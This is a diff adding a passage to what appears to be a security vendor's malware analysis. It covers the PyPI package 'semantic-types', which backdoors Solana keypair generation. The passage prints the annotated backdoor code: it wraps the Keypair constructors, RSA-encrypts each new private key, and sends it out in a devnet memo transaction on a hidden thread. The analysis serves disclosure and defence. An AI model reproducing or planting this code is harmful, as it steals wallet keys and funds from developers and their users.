@@ -47,6 +47,61 @@ Any time a keypair is created, the private key is silently captured and sent to 
 
 Below are [code](https://socket.dev/pypi/package/semantic-types/files/0.1.6/tar-gz/semantic_types-0.1.6/src/solana/rpc/types/__init__.py#L98) snippets of the backdoor functionality, annotated with inline comments:
 
+```python
+# Hardcoded RSA‑2048 public key for the threat actor
+pycrypto_pubkey = b"-----BEGIN PUBLIC KEY-----...END PUBLIC KEY-----"
+cipher = PKCS1_OAEP.new(RSA.import_key(pycrypto_pubkey))
+
+# Fixed threat actor keypair used to sign the memo transaction
+# This ensures all exfiltrated data originates from the same on-chain wallet
+sender = Keypair.from_seed([69, 192, 223, 24, 139, 168, 1, 225,
+                            241, 77, 160, 94, 138, 51, 99,
+                            66, 33, 79, 248, 44, 140, 29, 179,
+                            96, 232, 4, 240, 241, 84, 191, 182, 82])
+
+def transmit(kp_bytes):
+
+    # Solana Devnet RPC endpoint
+    client = Client(cluster_api_url("devnet"))
+
+    # Encrypt the private key and encode as Base64 for transport
+    # The encrypted payload is embedded in a memo instruction
+    memo_ix = create_memo(
+        MemoParams(
+            program_id = MEMO_PROGRAM_ID,
+            signer = sender.pubkey(),
+            message = base64.b64encode(cipher.encrypt(kp_bytes)),
+        )
+    )
+
+    # Construct a VersionedTransaction containing only the memo instruction
+    # Send it to the blockchain, where it will be publicly recorded
+    msg = MessageV0.try_compile(
+        payer = sender.pubkey(),
+        instructions = [memo_ix],
+        address_lookup_table_accounts = [],
+        recent_blockhash = client.get_latest_blockhash().value.blockhash,
+    )
+    client.send_transaction(VersionedTransaction(msg, [sender]), opts = TxOpts(skip_preflight = True))
+
+def augment_func(func):
+    def wrapper(self, *args, **kwargs):
+        kp = func(self, *args, **kwargs)
+
+        # Launch a background thread to exfiltrate the key asynchronously
+        threading.Thread(target = transmit,
+                         args = (bytes(kp),),
+                         daemon = True).start()
+        return kp
+    return wrapper
+
+# Replace original Keypair constructor methods with wrapped versions
+# This enables covert exfiltration during normal keypair generation
+for original, alias in method_pairs:
+    setattr(Keypair, alias, getattr(Keypair, original))
+    setattr(Keypair, original, augment_func(getattr(Keypair, alias)))
+```
+
 The package `semantic-types` is designed to exfiltrate Solana private keys. By embedding itself into the normal key-generation process, it intercepts newly created wallet secrets at the moment of generation and forwards them to the threat actor. The stolen keys are encrypted using a hardcoded RSA-2048 public key, ensuring that only the threat actor, who holds the corresponding private key, can decrypt and misuse them. Additionally, five other packages published by the same threat actor (`solana-keypair`, `solana-publickey`, `solana-mev-agent-py`, `solana-trading-bot`, and `soltrade`) explicitly list `semantic-types` as a dependency.
 
 Exfiltration is performed via a legitimate Solana RPC endpoint `api.devnet.solana.com` and embedded in a standard `spl.memo` transaction. This method allows the payload to bypass traditional network defenses and endpoint detection systems, which often focus on suspicious domains or outbound HTTP traffic.
